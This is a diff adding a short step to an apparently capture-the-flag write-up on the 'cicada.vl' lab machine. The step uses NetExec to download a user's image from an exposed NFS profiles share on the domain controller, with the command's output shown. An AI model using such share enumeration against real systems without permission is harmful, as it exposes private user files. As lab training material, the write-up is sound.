@@ -196,3 +196,11 @@ Now i can use this to go through all the different users profiles!
 
 So it looks like the administrator and `rosie.powell` both have images in their directories!
 
+```python
+nxc nfs DC-JPQ225.cicada.vl --share '/profiles' --get-file 'Rosie.Powell/marketing.png' marketing.png 
+NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Supported NFS versions: (2, 3, 4) (root escape:False)
+NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl [*] Downloading Rosie.Powell/marketing.png to marketing.png
+NFS         10.129.234.48   2049   DC-JPQ225.cicada.vl File successfully downloaded from Rosie.Powell/marketing.png to marketing.png
+```
+I cannot download the other PNG, i think its becuase it exists in the administrator directory!
+
